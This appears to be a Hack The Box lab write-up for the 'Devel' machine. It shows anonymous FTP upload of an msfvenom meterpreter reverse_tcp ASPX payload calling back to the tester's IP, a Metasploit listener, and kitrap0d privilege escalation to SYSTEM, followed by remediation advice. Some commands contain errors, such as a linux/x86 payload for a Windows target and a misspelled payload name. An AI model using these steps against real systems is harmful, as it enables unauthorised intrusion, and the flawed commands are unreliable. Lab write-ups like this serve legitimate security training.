Machine name : Devel
Platform : Hackthebox
difficulty : Easy-medium
target IP : 10.10.10.5

**Objective :** port 21 allows anonymous ftp login , so determine whether it can be exploited to obtain remote  SYSTEM-level access.

### Open Ports :
| Port | State | Service | Version                 |
| ---- | ----- | ------- | ----------------------- |
| 21   | Open  | ftp     | Microsoft ftpd          |
| 80   | Open  | http    | Microsoft IIS httpd 7.5 |
### Enumerating :
**nmap :**
![[Pasted image 20260716180813.png]]

**website :** http://10.10.10.5 
![[Pasted image 20260716182710.png|516]]
the open default web page , so there might be hidden directories.

**ftp :** port 21 
![[Pasted image 20260716185223.png|343]]
- allows anonymous login
- have 18494946 welcome.png , which can be modified and changed with another picture.

### Exploitation :

**Anonymous login :** trying the anonymous login to website through ftp.
```
ftp 10.10.10.5
```
- try id : anonymous , pass : anonymous
![[Pasted image 20260716192016.png|501]]
- now , put another picture into the system.
```
put dog.jpg
```
![[Pasted image 20260716192315.png|379]]
- successfully added picture :
![[Pasted image 20260716192408.png|352]]
![[Pasted image 20260716192433.png|437]]

**Malware insertion :**
- putting some **malware** into the machine :
find malware in (https://github.com/frizb/MSF-Venom-Cheatsheet).
- now, select a payload :
![[Pasted image 20260716200535.png|536]]
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx > ex.aspx
```
The **LHOST**=10.10.14.24 and **LPORT** = 4444.

![[Pasted image 20260716200808.png|635]]
malware payload is generated.

**Set up a multi/handler** :
A `multi/handler` is essentially a listener waiting for incoming payload connections.

**Open metasploit :** 
```
use exploit/multi/handler
```
![[Pasted image 20260716222608.png]]
- set up a **payload :**
```
set payload window/meterpreter/reverse_tcp
```
- set the LHOST AND LPORT as same as the payload :
```
LHOST=10.10.14.24 and LPORT = 4444
```
- set ExitOnSession `false`.
```
set ExitOnSession false
```
>as the handler **keeps listening after a session is established**, allowing additional incoming sessions to connect over time if set as false, if set as true then as soon as one Meterpreter session connects, the handler exits.

- run it :
```
exploit -j
```
**it allows :** 
The handler runs as a background job. and you immediately get your `msf>` prompt back.
The handler continues listening while you can run other modules, check sessions, or start additional handlers.

**ftp connection :**
- move back to the ftp connection and exit the past session and establish the connection again as anonymous.
- put the malware payload file into the machine using `put`.
```
put ex.aspx
```
check with `ls` to confirm.
- switch to binary  as the ASCII doesn't support aspx file type.
![[Pasted image 20260716224547.png|564]]

- engaging that malware :
```
http://10.10.10.5/ex.aspx
```
![[Pasted image 20260716224755.png|335]]

- result in gaining a active session over machine :
![[Pasted image 20260716224905.png|587]]

- Failed to obtain **`NT AUTHORITY\SYSTEM`** privileges.
![[Pasted image 20260716225327.png]]
- set session to background :
![[Pasted image 20260716225415.png]]

### Post exploitation enumeration :
- search suggester :
```
search suggester
```
![[Pasted image 20260716225633.png|535]]
- select the post module :
```
post/multi/recon/local_exploit_suggester
```

- set the session that was put to background `session 1` and `run`
![[Pasted image 20260716230038.png|436]]

- go through each exploit in this list till you gain authority privileges.
![[Pasted image 20260716230416.png|697]]
```
exploit/windows/local/ms10_015_kitrap0d
```

- set the LHOST and LPROT :
```
LHOST=10.10.14.24 and LPORT = 4445
```
- run but the session died :
![[Pasted image 20260716231600.png]]

- setup a listener again :
```
use exploit/multi/handler
```
- run and generate the payload again : 
![[Pasted image 20260716231326.png]]
- accessed another session in the machine : 
![[Pasted image 20260716231400.png|595]]
 
- move the session to the background 
![[Pasted image 20260716231442.png]]

- now use the privilege exploit again :
```
exploit/windows/local/ms10_015_kitrap0d
```
- set the newer session :
```
set session 2
```
- run :
![[Pasted image 20260716231840.png|591]]
the meterpreter session 3 opened.

- run `getuid` to check the authority :
![[Pasted image 20260716232029.png]]
gained the authority access over the system.
### Risk analysis :
**Severity : Critical**
>The target permits anonymous FTP access, allowing unauthenticated users to upload arbitrary files to the web server. Because the uploaded ASPX payload can be executed through IIS, an attacker can achieve remote code execution. Combined with a local privilege escalation vulnerability, this results in complete compromise of the system with **NT AUTHORITY\SYSTEM** privileges.

 **Impact**
 
 - Upload malicious files to the web server through anonymous FTP.
 - Execute arbitrary ASPX payloads using the IIS web server.
 - Obtain remote access to the system through a Meterpreter session.
 - Escalate privileges to **NT AUTHORITY\SYSTEM**.
 - Read, modify, or delete sensitive files.
 - Install malware, ransomware, or persistent backdoors.
 - Create new administrator accounts.
 - Disable security controls.
 - Use the compromised server as a pivot point to attack other internal systems.

### Remediation :
 - Disable anonymous FTP access unless it is explicitly required.
 - Restrict write permissions for FTP users.
 - Prevent uploaded files from being executed by the web server.
 - Keep Windows and IIS fully patched.
 - Apply the security updates addressing the local privilege escalation vulnerability.
 - Restrict access to FTP using authentication and firewall rules.
 - Monitor uploads and IIS logs for suspicious activity.

### Root Cause
> The compromise was possible because the FTP service allowed anonymous users to upload files into a web-accessible directory. The IIS web server executed the uploaded ASPX payload, providing remote code execution. Additionally, the operating system contained an unpatched local privilege escalation vulnerability, allowing the attacker to elevate privileges to **NT AUTHORITY\SYSTEM**.

# Conclusion

> The target system was successfully compromised due to the combination of anonymous FTP access, executable web content, and an unpatched local privilege escalation vulnerability. An attacker was able to upload and execute an ASPX payload through the IIS web server, establish remote access, and escalate privileges to **NT AUTHORITY\SYSTEM**. This resulted in complete compromise of the affected host and unrestricted control over the operating system.